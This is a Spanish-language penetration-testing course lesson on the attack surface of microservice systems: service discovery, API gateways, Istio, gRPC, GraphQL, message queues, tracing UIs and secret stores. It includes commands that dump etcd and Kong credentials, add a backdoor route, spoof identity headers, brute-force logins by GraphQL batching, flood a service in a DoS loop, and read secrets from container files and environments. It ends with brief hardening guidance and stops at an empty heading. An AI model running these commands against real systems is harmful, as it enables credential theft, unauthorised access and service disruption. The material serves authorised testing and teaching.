# Lección 05 — Microservices Architecture Patterns

Módulo 04: Containers and Software Architecture · Penetration Testing with Kali Linux 2026 · Red Team Leaders

## Introducción

El objetivo moderno no es un solo binario escuchando en el puerto 443. Es un grafo de decenas o cientos de servicios pequeños, cada uno hablando con los demás por gRPC, REST, topics de Kafka y sidecars del service mesh, coordinados por un plano de control que a su vez es un objetivo. Cuando un pentester compromete una sola aplicación web monolítica, el alcance queda acotado por ese proceso. Cuando un pentester compromete un solo microservice, el alcance queda acotado por lo que el mesh, el gateway y la network policy permiten que ese servicio alcance, que en la práctica suele ser «todo lo que hay en el clúster».

Esta lección mapea el paisaje moderno de microservices desde el punto de vista del atacante. Vamos a cubrir cómo se encuentran los servicios (Consul, etcd, DNS de Kubernetes), cómo entran las peticiones al mesh (API gateways como Kong, Envoy y Traefik), cómo se autentican entre sí (mTLS mediante Istio y Linkerd) y cómo se comunican de forma asíncrona (Kafka, RabbitMQ, NATS). En cada patrón vamos a mirar qué se rompe, qué se filtra y qué pivotes quedan disponibles. Al terminar deberías poder entrar en un entorno que «corre sobre Kubernetes e Istio» y saber exactamente qué endpoints sondear primero.

## 1. Introducción: el objetivo moderno es un grafo de servicios, no un binario

Hace una década, un pentest web era en gran medida el estudio de una aplicación grande: un formulario de login, un almacén de sesión, una base de datos, una shell subida. Hoy la misma funcionalidad suele estar partida en un servicio de autenticación, un servicio de perfil de usuario, un servicio de inventario, un servicio de precios, un servicio de checkout, un servicio de notificaciones y un servicio de reporting: cada uno en su propio contenedor, cada uno escalado por separado y cada uno hablando con un broker de mensajes y con una pila de observabilidad compartida.

Para el atacante esto cambia todo el modelo mental:

- El perímetro no es un firewall alrededor de un host. Es un API gateway o un ingress controller que se sienta delante de un grafo de servicios.
- Comprometer un servicio rara vez te da las joyas de la corona. Te da un punto de apoyo dentro del mesh, y desde ahí el movimiento lateral hacia servicios más privilegiados es el objetivo real.
- La confianza suele estar mediada por certificados mTLS, no por una cookie de sesión. Robar una identidad de carga de trabajo es más útil que robar una sesión de usuario.
- La configuración y los secrets viven en sistemas centralizados (Vault, Consul KV, Secrets de Kubernetes, Spring Cloud Config). Una sola filtración a menudo abre muchos servicios a la vez.

```text
                    ┌─────────────────────┐
   Internet ──────► │   API Gateway       │  (Kong / Envoy / Traefik)
                    │   authn, rate-limit │
                    └──────────┬──────────┘
                               │
                    ┌──────────▼──────────┐
                    │   Service Mesh      │  (Istio / Linkerd)
                    │   mTLS + policy     │
                    └──────────┬──────────┘
                               │
     ┌─────────────┬───────────┼───────────┬─────────────┐
     ▼             ▼           ▼           ▼             ▼
  auth-svc    profile-svc  cart-svc   pricing-svc   checkout-svc
     │             │           │           │             │
     └──────┬──────┴───────────┴─────┬─────┘             │
            ▼                        ▼                   ▼
        Postgres                 Kafka bus          Vault (secrets)
```

> **Idea del pentester:** La primera pregunta en cualquier evaluación moderna ya no es «qué versión de Apache está corriendo». Es «hay un service mesh, y qué hace cumplir de verdad su política de autorización». Todo lo demás se sigue de esa respuesta.

## 2. Monolito frente a microservices: los trade-offs y la nueva superficie de ataque

### 2.1 El cambio

| Aspecto | Monolito | Microservices |
| --- | --- | --- |
| Despliegue | Un artefacto | Decenas de artefactos, desplegados por separado |
| Datos | Una base de datos | Una base de datos por servicio (normalmente) |
| Auth | Una sesión por usuario | Tokens de servicio a servicio, o mTLS en todas partes |
| Fallo | Se cae la aplicación entera | Un servicio se degrada y los demás compensan |
| Superficie de ataque | Un proceso, muchos endpoints | Muchos procesos, cada uno con sus propios endpoints |

### 2.2 Qué gana el atacante

El atacante del monolito que poseía la aplicación también poseía la base de datos, el sistema de archivos y la memoria de cada petición. El atacante de microservices que posee un servicio posee:

- La memoria de proceso de ese servicio (secrets en variables de entorno, tokens cacheados, claves JWKS)
- El alcance de red de salida del servicio (lo que permita la network policy)
- La identidad del servicio (SPIFFE ID, token de service account, certificado de cliente mTLS)
- Las colas a las que el servicio se suscribe o en las que publica

Eso a menudo es más de lo que te daba el monolito, porque las service accounts y las identidades de carga de trabajo suelen estar sobreprivilegiadas.

### 2.3 Qué pierde el atacante

- Una inyección SQL en un servicio rara vez llega a todas las tablas: cada servicio es dueño de sus propias bases de datos.
- Las subidas de archivos que aterrizaban en el servidor de la aplicación ya no tocan el mismo disco que facturación.
- Un solo RCE te da shell en un contenedor que probablemente es de solo lectura, distroless y no tiene herramientas de shell instaladas.

El tradeoff, entonces, es este: menos victorias fáciles por servicio, pero muchos más servicios que atacar, y un movimiento lateral mucho mejor una vez que caes.

## 3. Patrones de service discovery

Los servicios tienen que encontrarse por nombre, no por IP, porque las IP cambian cada vez que un pod se reinicia. Existen tres patrones dominantes.

### 3.1 Consul

HashiCorp Consul corre un agente en cada nodo. Los servicios se registran en el agente local, y los demás servicios consultan Consul por DNS o por HTTP.

```bash
# Consulta Consul por un servicio registrado, vía su API HTTP:
curl -s http://consul.internal:8500/v1/catalog/services | jq
# {
#   "auth-svc": ["primary","canary"],
#   "cart-svc": [],
#   "pricing-svc": ["v2"]
# }

# Lista cada nodo registrado en Consul:
curl -s http://consul.internal:8500/v1/catalog/nodes | jq '.[].Node'

# Vuelca el almacén KV (a menudo contiene configuración y, en despliegues malos, secrets):
curl -s http://consul.internal:8500/v1/kv/?recurse | jq
```

Si la API HTTP de Consul es alcanzable sin un token ACL, el atacante tiene un mapa autoritativo del entorno y, a menudo, acceso directo a los datos de configuración.

### 3.2 etcd

etcd sostiene Kubernetes y, en algunos entornos, se usa directamente como registro de servicios. Escucha en TCP/2379 (cliente) y TCP/2380 (peer).

```bash
# etcdctl v3 contra un etcd sin autenticar (esto es un hallazgo real en el mundo):
export ETCDCTL_API=3
etcdctl --endpoints=http://etcd.internal:2379 get / --prefix --keys-only | head -30

# En Kubernetes, etcd guarda cada Secret. Si puedes leerlo, el clúster es tuyo:
etcdctl --endpoints=http://etcd.internal:2379 get /registry/secrets/ --prefix
```

> **Idea del pentester:** Nunca des por hecho que etcd está detrás de un firewall. En clústeres armados a las apuradas queda expuesto en `0.0.0.0` sin exigencia de certificado de cliente. Un solo `curl http://etcd:2379/v2/keys/?recursive=true` puede devolver cada Secret del clúster en claro.

### 3.3 DNS de Kubernetes

Kubernetes corre CoreDNS dentro del clúster. Cada Service recibe un nombre DNS de la forma `<service>.<namespace>.svc.cluster.local`.

```bash
# Desde un pod comprometido, enumera servicios del namespace actual:
dig +short auth-svc.default.svc.cluster.local

# Enumera servicios en todos los namespaces que puedas alcanzar:
for ns in default kube-system istio-system monitoring; do
  for svc in auth cart profile pricing checkout admin internal-api; do
    dig +short ${svc}.${ns}.svc.cluster.local
  done
done

# Pídele a CoreDNS que recorra el clúster (solo funciona si AXFR está mal configurado; raro, pero posible):
dig @kube-dns.kube-system.svc.cluster.local cluster.local AXFR
```

Incluso sin AXFR, forzar nombres de servicio es barato. Una wordlist de nombres habituales (`auth`, `admin`, `internal`, `metrics`, `debug`, `api`, `db`) devuelve aciertos rápido.

## 4. Patrón API gateway: el único cuello de botella

El API gateway es la puerta de entrada. Se encarga de la terminación TLS, la autenticación, el rate limiting, la reescritura de peticiones y el enrutado hacia el servicio upstream correcto.

### 4.1 Gateways habituales

| Gateway | Plano de datos | Notas |
| --- | --- | --- |
| Kong | OpenResty (nginx + Lua) | Muchos plugins; la API de admin es un objetivo enorme |
| Envoy | C++, configuración xDS | Debajo de Istio y de muchos meshes |
| Traefik | Go | Muy popular como ingress de Docker/Kubernetes |
| NGINX Ingress | nginx | El valor por defecto de muchos clústeres de Kubernetes |

### 4.2 Qué hace el gateway

- Termina el TLS que viene de internet
- Valida un JWT o una API key e inyecta una cabecera de identidad interna
- Hace cumplir rate limits por ruta
- Reescribe paths (`/api/v1/orders` → `/orders`)
- Reenvía al servicio interno por nombre

### 4.3 Ángulo de ataque: saltarse el gateway por DNS interno

El gateway solo es un cuello de botella si el tráfico tiene que pasar por él. En muchos clústeres el Service interno es alcanzable directamente desde cualquier pod del mismo namespace, y así se saltan todas las reglas de authn y de rate-limit.

```bash
# Desde fuera: todo pasa por el gateway, con authn:
curl -H "Authorization: Bearer $TOKEN" https://api.example.com/v1/users/me

# Desde un pod comprometido dentro del clúster: te saltas el gateway por completo:
curl http://user-svc.default.svc.cluster.local:8080/users/me
# 200 OK — the internal service trusts the caller because "you got past the gateway"
# but you did not: you came in the side door.
```

Este es uno de los hallazgos más comunes en las evaluaciones modernas. La defensa es autorización por servicio, aplicada por el propio servicio y no por el gateway, o una AuthorizationPolicy en el sidecar del mesh.

### 4.4 La API de admin de Kong: una pesadilla recurrente

Kong trae una API de admin en el puerto 8001 que, si se deja sin autenticar en una interfaz alcanzable, permite a un atacante añadir rutas, quitar plugins y volcar cada credencial que Kong guarda.

```bash
# Enumera las rutas de Kong:
curl -s http://kong.internal:8001/routes | jq

# Lee cada credencial de consumer (secrets de JWT, API keys, hashes de basic-auth):
curl -s http://kong.internal:8001/consumers | jq -r '.data[].id' \
  | while read id; do curl -s http://kong.internal:8001/consumers/$id/jwt; done

# Añade una ruta nueva que se salta todos los plugins:
curl -X POST http://kong.internal:8001/services/protected-svc/routes \
  -d 'paths[]=/backdoor' -d 'strip_path=false'
```

### 4.5 Bugs de confianza en cabeceras

Los gateways a menudo inyectan `X-Forwarded-User`, `X-Auth-Request-User` o `X-Remote-User`. Si el servicio upstream confía en esas cabeceras de forma incondicional y no las elimina de las peticiones del cliente, un atacante puede falsificarlas directamente contra el endpoint interno.

```bash
curl -H "X-Forwarded-User: admin" \
     http://profile-svc.default.svc.cluster.local:8080/admin/dump
```

## 5. Service mesh: sidecars, mTLS y escape hacia el plano de control

Un service mesh inyecta un proxy sidecar (Envoy para Istio, linkerd2-proxy para Linkerd) al lado de cada servicio. El sidecar eleva de forma transparente las conexiones dentro del clúster a mTLS, hace cumplir políticas de autorización y emite telemetría.

### 5.1 Istio en un diagrama

```text
   ┌──────────────────────────────────────────┐
   │ Pod                                      │
   │  ┌────────────┐   ┌──────────────────┐   │
   │  │ app :8080  │◄─►│ envoy sidecar    │◄──┼──► other pods (mTLS)
   │  └────────────┘   │  :15001 in       │   │
   │                   │  :15006 out      │   │
   │                   │  :15020 status   │   │
   │                   └──────────────────┘   │
   └──────────────────────────────────────────┘
                          ▲
                          │ xDS config
                          │
                   ┌──────┴──────┐
                   │  istiod     │  (control plane)
                   └─────────────┘
```

### 5.2 Mala configuración del sidecar

El sidecar es transparente porque las reglas de iptables dentro del pod redirigen todo el tráfico hacia Envoy. Si esas reglas están rotas, o si la aplicación se vincula a `0.0.0.0` en un puerto que Istio no conoce, el tráfico puede rodear el sidecar y saltarse mTLS por completo.

```bash
# Desde dentro del pod, inspecciona la interfaz de admin de Envoy (vinculada a localhost):
curl -s http://127.0.0.1:15000/config_dump | jq '.configs[].dynamic_active_clusters' | head

# Lista los listeners: todo lo que Envoy no gestione es candidato a bypass:
curl -s http://127.0.0.1:15000/listeners

# Vuelca cada certificado que el sidecar haya emitido o en el que confíe:
curl -s http://127.0.0.1:15000/certs | jq
```

### 5.3 Bajada de nivel de mTLS

Istio tiene tres modos: `STRICT`, `PERMISSIVE` y `DISABLE`. `PERMISSIVE` es el valor por defecto durante la migración y acepta tanto texto plano como mTLS. Un atacante que caiga en el mesh a menudo puede alcanzar los servicios `PERMISSIVE` en texto plano, saltándose por completo el requisito de certificado de cliente.

```bash
# Revisa el PeerAuthentication de todo el mesh:
kubectl -n istio-system get peerauthentication -o yaml

# Si mtls.mode es PERMISSIVE en algún sitio, golpea esos servicios sin certificado de cliente:
curl http://permissive-svc.default.svc.cluster.local:8080/internal/dump
```

### 5.4 Escape hacia el plano de control

El plano de control del mesh (`istiod` en Istio, `linkerd-destination` en Linkerd) emite certificados y empuja configuración xDS a cada sidecar. Comprometer el plano de control compromete el mesh entero.

- El servicio istiod escucha en 15012 (xDS), 15010 (xDS en texto plano: no debería estar expuesto), 15014 (monitorización) y 8080 (debug).
- El endpoint `/debug` en `:8080` expone el estado del clúster, el estado de sincronización de la configuración y los listados de endpoints.

```bash
# Si el endpoint de debug de istiod es alcanzable, esto es un premio gordo de topología:
curl -s http://istiod.istio-system.svc.cluster.local:8080/debug/configz | jq
curl -s http://istiod.istio-system.svc.cluster.local:8080/debug/endpointz | jq
curl -s http://istiod.istio-system.svc.cluster.local:8080/debug/syncz | jq
```

> **Idea del pentester:** La interfaz de debug de istiod se ha dejado expuesta dentro de clústeres una y otra vez. Es, posiblemente, la fuente más rica de topología interna de todo el mesh: cada servicio, cada endpoint, cada política.

## 6. Patrón Backend for Frontend (BFF)

El patrón BFF coloca un servicio backend pequeño entre cada tipo de cliente (web, móvil, TV) y los microservices compartidos de más abajo. Cada BFF está recortado a las necesidades de datos de su cliente y agrega varias llamadas downstream en una sola respuesta.

```text
   Web SPA ────► web-bff  ─┐
                            ├──► auth-svc, cart-svc, pricing-svc, ...
   Mobile app ─► mobile-bff─┘
```

### 6.1 Por qué existen los BFF

- Reducen los viajes de ida y vuelta: una llamada al BFF reemplaza cinco llamadas downstream.
- Dan forma a las respuestas para el cliente: quitan campos que la app móvil no necesita.
- Centralizan la authn por tipo de cliente.

### 6.2 Ángulo de ataque

El BFF a menudo guarda una credencial downstream de larga vida (un token de servicio, un secret emitido por Vault) con acceso de lectura amplio a los servicios downstream. Si el BFF es explotable —SSRF, inyección de plantillas, prototype pollution— el atacante hereda esa credencial amplia.

Además, los BFF son famosos por bugs al dar forma a la respuesta: quitan campos sensibles en la respuesta al cliente, pero se olvidan de quitarlos en las respuestas de error, en los endpoints de debug o en la introspección de GraphQL. Un atacante que pueda disparar un camino de error verboso a menudo obtiene el payload downstream en crudo.

```bash
# Fuerza un error downstream e inspecciona el cuerpo upstream filtrado:
curl 'https://web-bff.example.com/api/product?id=%00'
# 500 Internal Server Error
# {"error":"downstream: {\"internal_price\":42,\"cost_basis\":18,\"vendor_id\":\"acme\"}"}
```

## 7. Estilos de comunicación: síncrono frente a asíncrono

### 7.1 Síncrono

- REST sobre HTTP/1.1 o HTTP/2: el caballo de batalla. Payloads JSON, superficie de ataque familiar.
- gRPC sobre HTTP/2: payloads protobuf, framing binario, más difícil de fuzzear a ciegas.
- GraphQL sobre HTTP: un solo endpoint, consultas con la forma que elige el cliente, y su propio conjunto de trampas.

### 7.2 Asíncrono

- Kafka: basado en topics, alto caudal, log distribuido. Los producers publican, los consumers se suscriben.
- RabbitMQ: exchanges y colas AMQP, semántica más tradicional de broker de mensajes.
- NATS / NATS JetStream: pub/sub ligero, enrutado por subject.
- AWS SQS / GCP Pub/Sub / Azure Service Bus: equivalentes gestionados.

### 7.3 Por qué la distinción le importa al atacante

La mensajería asíncrona cambia lo que significa «comprometer». Un servicio que publica en un topic de Kafka no se preocupa de quién escucha. Si puedes enganchar un consumer a ese topic —porque Kafka no tiene authn, o porque la ACL del topic es legible por todo el mundo— obtienes un feed en vivo de cada evento que recorre el sistema: altas de usuario, pedidos, reseteos de contraseña, actualizaciones de PII.

El replay de mensajes es otra victoria asimétrica. En los sistemas síncronos la petición y la respuesta son de un solo tiro. En los sistemas asíncronos, un mensaje capturado a menudo se puede reinyectar días después. Las claves de idempotencia y la firma de mensajes son las defensas; la mayoría de los sistemas no las hacen cumplir.

## 8. gRPC en profundidad

gRPC es un framework RPC moderno construido sobre HTTP/2 y Protocol Buffers. Es rápido, fuertemente tipado y cada vez más habitual en el tráfico este-oeste entre servicios.

### 8.1 El formato en el cable

Cada llamada es una petición HTTP/2:

```text
:method = POST
:scheme = https
:path   = /package.Service/Method
:authority = svc.internal
content-type = application/grpc+proto
te = trailers
grpc-timeout = 5S

<length-prefixed protobuf frame>
```

Como es HTTP/2, los proxies y las capturas HTTP estándar funcionan, pero el cuerpo es protobuf, así que curl solo no te muestra nada útil. Ahí entra grpcurl.

### 8.2 grpcurl y server reflection

Si el servidor habilita la server reflection de gRPC (el servicio `grpc.reflection.v1.ServerReflection`), un cliente puede enumerar cada servicio y cada método que el servidor expone sin conocer de antemano los archivos `.proto`.

```bash
# Kali 2026 trae grpcurl en /usr/bin/grpcurl. Si no está, instálalo:
sudo apt install grpcurl

# Lista cada servicio que expone el objetivo (hace falta reflection):
grpcurl -plaintext auth-svc.default.svc.cluster.local:50051 list
# grpc.reflection.v1.ServerReflection
# grpc.health.v1.Health
# acme.auth.v1.AuthService
# acme.auth.v1.AdminService

# Lista los métodos de un servicio:
grpcurl -plaintext auth-svc.default.svc.cluster.local:50051 list acme.auth.v1.AdminService
# acme.auth.v1.AdminService.ListUsers
# acme.auth.v1.AdminService.ResetPassword
# acme.auth.v1.AdminService.ImpersonateUser

# Describe un tipo de mensaje:
grpcurl -plaintext auth-svc.default.svc.cluster.local:50051 describe acme.auth.v1.ImpersonateRequest

# Invoca un método con un cuerpo JSON (grpcurl convierte JSON <-> protobuf):
grpcurl -plaintext -d '{"user_id":"1"}' \
  auth-svc.default.svc.cluster.local:50051 \
  acme.auth.v1.AdminService.ImpersonateUser
```

### 8.3 Reflection como filtración de información

La server reflection es una función de depuración. Dejarla habilitada en producción le entrega al atacante toda la superficie de API: cada método interno, cada tipo de mensaje, cada nombre de campo. Es el equivalente gRPC de dejar Swagger UI abierto.

### 8.4 Atacar gRPC sin reflection

Si reflection está deshabilitada necesitas los archivos `.proto`. Opciones:

- Extraerlos del binario del cliente (las apps móviles a menudo los traen, o traen un descriptor JSON).
- Recuperarlos de la imagen del contenedor (`grep -R "syntax = \"proto3\"" /`).
- Reconstruirlos a partir de capturas de paquetes: usa protobuf-inspector o protoscope para adivinar tags y tipos de campo, y luego reconstruye un `.proto`.

```bash
# Captura tráfico gRPC con mitmproxy (Kali 2026 soporta HTTP/2 de fábrica):
mitmproxy --mode reverse:https://auth-svc.internal:50051 --listen-port 8443

# Vuelca un cuerpo protobuf capturado:
protoscope -explicit-length-prefix < body.bin
```

### 8.5 Trampas de autorización en gRPC

- La authz a nivel de método a menudo se olvida, porque el middleware al estilo HTTP no se aplica con limpieza.
- La metadata (el equivalente gRPC de las cabeceras) se confía con frecuencia desde el cliente sin validación: la metadata `x-user-id` y `x-tenant-id` está madura para falsificarla.
- Los RPC de streaming se saltan las comprobaciones de authz por petición que solo se disparan una vez, al abrir el stream.

## 9. GraphQL como frontend de microservices

GraphQL a menudo se coloca delante de un backend de microservices, y actúa como un único endpoint de consulta que se abre en abanico hacia los servicios correctos.

### 9.1 Introspección

```bash
# Consulta de introspección completa (vuelca el schema):
curl -X POST https://api.example.com/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { types { name fields { name type { name kind } } } } }"}' \
  | jq > schema.json

# Si /graphql acepta GET con un query param, la introspección también funciona por GET:
curl 'https://api.example.com/graphql?query=%7B__schema%7Btypes%7Bname%7D%7D%7D'
```

Incluso cuando la introspección está deshabilitada, herramientas como clairvoyance pueden forzar nombres de campo para reconstruir el schema.

### 9.2 Ataques de batching

Muchos servidores GraphQL aceptan un array de consultas en un solo POST:

```bash
curl -X POST https://api.example.com/graphql \
  -H 'Content-Type: application/json' \
  -d '[
    {"query":"mutation{login(user:\"a\",pass:\"1\"){token}}"},
    {"query":"mutation{login(user:\"a\",pass:\"2\"){token}}"},
    {"query":"mutation{login(user:\"a\",pass:\"3\"){token}}"}
  ]'
```

Los rate limits que cuentan peticiones HTTP no cuentan las consultas de dentro de un batch. Una sola petición puede intentar miles de logins.

### 9.3 Bypass de auth por campo

Un resolver de `User.email` puede comprobar la auth; un resolver de `User.internalEmail` puede haberse añadido después y haberse olvidado. Introspecciona cada campo y sonda cada uno por separado.

```bash
# Sonda cada campo del tipo User:
for field in id name email internalEmail role tenantId ssn phone address; do
  echo "== $field =="
  curl -s -X POST https://api.example.com/graphql \
    -H 'Content-Type: application/json' \
    -d "{\"query\":\"{ user(id:\\\"1\\\"){ $field } }\"}"
done
```

### 9.4 DoS por consulta anidada

GraphQL deja que los clientes especifiquen consultas anidadas de profundidad arbitraria. Sin límites de profundidad, `friends { friends { friends { ... } } }` puede costar O(n^k) al resolverse.

## 10. Colas de mensajes: Kafka, RabbitMQ, dead-letter queues

### 10.1 Kafka

Los topics de Kafka son logs. Los consumers leen desde un offset; los producers hacen append.

```bash
# Lista topics contra un broker sin autenticar:
kafka-topics.sh --bootstrap-server kafka.internal:9092 --list

# Describe un topic (número de particiones, replicación, config):
kafka-topics.sh --bootstrap-server kafka.internal:9092 --describe --topic user.signups

# Consume mensajes desde el principio:
kafka-console-consumer.sh --bootstrap-server kafka.internal:9092 \
  --topic user.signups --from-beginning --max-messages 20

# Produce un mensaje (peligroso: esto ya es un evento durable en el sistema):
kafka-console-producer.sh --bootstrap-server kafka.internal:9092 --topic user.signups
```

### 10.2 Ángulo de ataque: broker sin autenticar

Kafka históricamente se distribuía sin authn. Incluso con SASL/SCRAM disponible, muchos despliegues siguen exponiendo listeners `PLAINTEXT` en texto plano en redes internas. Si puedes llegar a `:9092`, normalmente puedes leer cada topic.

### 10.3 PII en los mensajes

Los payloads de los mensajes suelen ser blobs JSON de cada campo asociado a un evento. Un topic `user.updated` puede incluir nombres completos, direcciones, contraseñas hasheadas y tokens de reset. Aunque la base de datos primaria esté bien protegida, la cola a menudo no lo está.

### 10.4 Ataques de replay

Kafka retiene los mensajes durante horas o días. Un atacante que capture un mensaje `payment.authorized` de hace tres días a menudo puede reinyectarlo en un topic downstream que no tenga comprobaciones de idempotencia.

### 10.5 RabbitMQ

```bash
# La UI de management en :15672 es un objetivo enorme si es alcanzable:
curl -u guest:guest http://rabbit.internal:15672/api/queues | jq

# Lista cada exchange:
curl -u guest:guest http://rabbit.internal:15672/api/exchanges | jq '.[].name'

# Mira mensajes de una cola (get sin ack):
curl -u guest:guest -X POST http://rabbit.internal:15672/api/queues/%2f/orders/get \
  -H 'Content-Type: application/json' \
  -d '{"count":10,"ackmode":"ack_requeue_true","encoding":"auto"}'
```

Las credenciales por defecto `guest:guest` siguen presentes en más entornos de los que esperarías, aunque RabbitMQ moderno las restringe a localhost por defecto.

### 10.6 Dead-letter queues

Cuando un mensaje falla el procesamiento una y otra vez, los brokers lo mueven a una DLQ. Las DLQ a menudo acumulan meses de mensajes sin procesar, incluidos mensajes que fallaron porque contenían datos sensibles de casos límite. Son un objetivo rico y a menudo tienen la misma authz que las colas principales, o ninguna.

## 11. Patrones event-driven y CQRS

### 11.1 Arquitectura event-driven

Los servicios se comunican sobre todo mediante eventos en un bus. Pedido creado, pago autorizado, inventario reservado: cada uno es un evento, y cada servicio interesado se suscribe.

### 11.2 CQRS: Command Query Responsibility Segregation

Las escrituras van a un modelo de comandos que emite eventos. Las lecturas van a un modelo de consulta que se llena proyectando esos eventos en almacenes de lectura desnormalizados.

```text
   Command:  POST /orders  ──►  order-cmd-svc  ──► events on "orders" topic
                                                    │
                        ┌───────────────────────────┤
                        ▼                           ▼
                  order-read-svc              analytics-svc
                  (query store)               (warehouse)
```

### 11.3 Implicaciones para el ataque

- El modelo de escritura y el modelo de lectura pueden hacer cumplir autorizaciones distintas. Lee el lado de consulta para saltarte las comprobaciones del lado de escritura.
- Los replays de eventos durante la recuperación pueden volver a ejecutar efectos secundarios si los handlers no son idempotentes.
- Los schemas de eventos normalmente no se hacen cumplir de forma estricta. Inyectar un evento con campos inesperados puede disparar bugs downstream.

## 12. Circuit breakers, reintentos, timeouts

### 12.1 El patrón

Para que una dependencia que falla no se lleve por delante a quien la llama, los clientes envuelven las llamadas de salida en:

- Timeouts: abandonar la llamada después de N ms
- Reintentos: volver a intentar ante un fallo, a menudo con backoff exponencial
- Circuit breakers: después de M fallos consecutivos, dejar de llamar durante un periodo de enfriamiento

Librerías: Hystrix (legado), Resilience4j, Polly (.NET) y las versiones nativas del mesh en Istio y Linkerd.

### 12.2 Abuso: tormentas de reintentos

Si un servicio reintenta tres veces ante un 5xx, y quien llama a ese servicio también reintenta tres veces, y quien llama a ese también reintenta tres veces, una petición mala puede amplificarse hasta 27 peticiones downstream. Un atacante que pueda disparar de forma fiable un 5xx desde el servicio más profundo puede empujar carga de forma exponencial de vuelta hacia arriba en la pila.

```bash
# Dispara una entrada malformada que produzca 500 de forma fiable desde un servicio profundo:
while true; do
  curl -s -o /dev/null "https://api.example.com/v1/search?q=$(python3 -c 'print("A"*100000)')" &
done
```

### 12.3 Abuso: disparar el circuit breaker como primitiva de DoS

Haz que el circuit breaker se dispare para una dependencia objetivo, y cada llamador de esa dependencia ahora cortocircuita. En algunos montajes esto tiene ámbito de usuario (circuit breakers por tenant) y se puede usar como arma contra un solo tenant.

## 13. Trazas distribuidas: Jaeger, Zipkin, OpenTelemetry

### 13.1 Qué hace el tracing

A cada petición entrante se le asigna un trace ID. A medida que la petición recorre los servicios, cada span registra el servicio, la operación, la latencia y los tags. El resultado es un árbol de llamadas que visualiza el camino entero de la petición.

### 13.2 Cabeceras de traza

- W3C Trace Context: `traceparent`, `tracestate`
- B3 (Zipkin): `X-B3-TraceId`, `X-B3-SpanId`, `X-B3-ParentSpanId`, `X-B3-Sampled`
- Jaeger: `uber-trace-id`

Seguir estas cabeceras como atacante te permite correlacionar tus peticiones a través de cada servicio que tocan.

### 13.3 Ángulo de ataque: UI de tracing expuesta

Las UI de Jaeger, Zipkin y Tempo se despliegan habitualmente dentro del clúster sin autenticación porque «son solo internas». También se exponen sin querer, con frecuencia, mediante un Ingress suelto.

```bash
# UI de Jaeger por defecto:
curl -s http://jaeger.internal:16686/api/services | jq
# ["auth-svc","cart-svc","checkout-svc","admin-svc","payment-svc","kyc-svc"]

# Para cada servicio, lista las operaciones:
for svc in $(curl -s http://jaeger.internal:16686/api/services | jq -r '.data[]'); do
  echo "== $svc =="
  curl -s "http://jaeger.internal:16686/api/services/$svc/operations" | jq -r '.data[]'
done

# Saca trazas que contengan una operación interesante:
curl -s "http://jaeger.internal:16686/api/traces?service=payment-svc&operation=charge&limit=20" | jq
```

Esa sola UI revela cada servicio, cada nombre de operación, cada dependencia downstream y, a menudo, valores de tag que incluyen IDs de usuario, IDs de tenant y URLs internas.

### 13.4 OpenTelemetry Collector

El collector OTLP en `:4317` (gRPC) y `:4318` (HTTP) a menudo no está autenticado dentro del clúster. Un atacante puede inundarlo con spans falsos, inyectar datos engañosos en el sistema de observabilidad y ahogar las alertas reales.

## 14. Configuración y secrets en microservices

### 14.1 Sistemas habituales

- Spring Cloud Config Server: servicio de configuración respaldado por Git; `/actuator/env` solía ser la filtración clásica
- HashiCorp Vault: almacén de secrets autenticado por token; envuelve KV, PKI y credenciales dinámicas de base de datos
- Consul KV: se usa a menudo para feature flags y (mal) para secrets
- Secrets / ConfigMaps de Kubernetes: con ámbito de namespace, codificados en base64 (no cifrados en reposo por defecto)
- AWS Secrets Manager, GCP Secret Manager, Azure Key Vault: gestionados por el cloud

### 14.2 Caminos de filtración

Spring Boot Actuator, si está expuesto, entrega la configuración en una petición:

```bash
# La filtración clásica de Actuator:
curl -s https://svc.example.com/actuator/env | jq
curl -s https://svc.example.com/actuator/configprops | jq
curl -s https://svc.example.com/actuator/heapdump -o heap.bin
# Luego extrae strings y busca tokens, URIs de base de datos y secrets de JWT:
strings heap.bin | grep -Ei 'password|secret|token|BEGIN RSA'
```

Vault, cuando se alcanza con un token válido, se puede consultar:

```bash
export VAULT_ADDR=https://vault.internal:8200
export VAULT_TOKEN=$(cat /var/run/secrets/vault/token)

# Lista los paths a los que puedes acceder:
vault token capabilities $VAULT_TOKEN secret/data/prod/db

# Lee un secret:
vault kv get -format=json secret/prod/db | jq
```

Los Secrets de Kubernetes montados en un pod son solo archivos:

```bash
# Desde dentro de un contenedor comprometido:
find /var/run/secrets -type f 2>/dev/null | xargs -I{} sh -c 'echo "== {} ==" ; cat "{}"'
find / -name '*.env' -o -name 'application.yml' -o -name 'appsettings.json' 2>/dev/null
```

### 14.3 La filtración por variable de entorno

La configuración pasada por variables de entorno es visible para cada proceso del contenedor y a menudo aflora en páginas de error, endpoints de debug o listados de procesos.

```bash
# Desde dentro de un contenedor:
cat /proc/1/environ | tr '\0' '\n' | grep -Ei 'key|token|secret|password'
```

## 15. Flujo de reconocimiento de ataque: mapear el mesh desde un solo punto de apoyo

El fuente parte de un shell en un solo contenedor de aplicación y recorre seis comprobaciones. Los comandos no se incluyen. Lo que cada una revela, y por tanto lo que hay que cerrar, es esto:

- **Identidad.** El token de la ServiceAccount montado en el pod y las reglas que el API server le concede.
- **DNS del clúster.** Nombres habituales (`api`, `vault`, `kafka`, `jaeger`, `grafana`) resuelven dentro de namespaces como `default`, `kube-system` o `istio-system` aunque no estén publicados fuera.
- **HTTP interno.** Paths como `/health`, `/metrics`, `/actuator/env`, `/swagger`, `/graphql` o `/admin` responden sin autenticación dentro del mesh.
- **gRPC.** La reflection en puertos típicos (50051, 9090) lista los servicios si quedó activada.
- **Trazas.** Un `traceparent` que entra por el gateway y se consulta en Jaeger muestra cada servicio que la petición tocó, con sus tags.
- **`/metrics`.** Prometheus dentro del mesh rara vez exige autenticación. Etiquetas como `http_requests_total` delatan rutas de admin que no están documentadas fuera.

La sección 16 convierte cada uno de esos huecos en NetworkPolicy, mTLS y autenticación.

## 16. Detección y endurecimiento

### 16.1 Network policies

Deny por defecto del egress a nivel de namespace, y luego lista blanca solo de los destinos que cada pod necesita. Sin esto, un pod comprometido puede alcanzar cada servicio del clúster.

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: default-deny-all
  namespace: prod
spec:
  podSelector: {}
  policyTypes: [Ingress, Egress]
```

### 16.2 mTLS en todas partes

Pon el PeerAuthentication de todo el mesh en `STRICT`:

```yaml
apiVersion: security.istio.io/v1
kind: PeerAuthentication
metadata:
  name: default
  namespace: istio-system
spec:
  mtls:
    mode: STRICT
```

### 16.3 Autorización por servicio

